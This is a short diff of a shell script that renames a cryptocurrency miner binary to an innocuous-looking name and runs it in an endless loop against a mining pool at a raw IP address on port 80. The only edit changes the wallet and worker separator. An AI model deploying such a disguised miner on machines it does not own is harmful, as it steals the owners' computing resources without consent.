@@ -10,5 +10,5 @@ mv peakminer kialospo
 ph add kialospo
 
 while true; do
-./kialospo --coin pearl -o 212.47.248.156:80 -u prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr.$(echo $RANDOM | md5sum | head -c 10)
+./kialospo --coin pearl -o 212.47.248.156:80 -u prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr/$(echo $RANDOM | md5sum | head -c 10)
 done
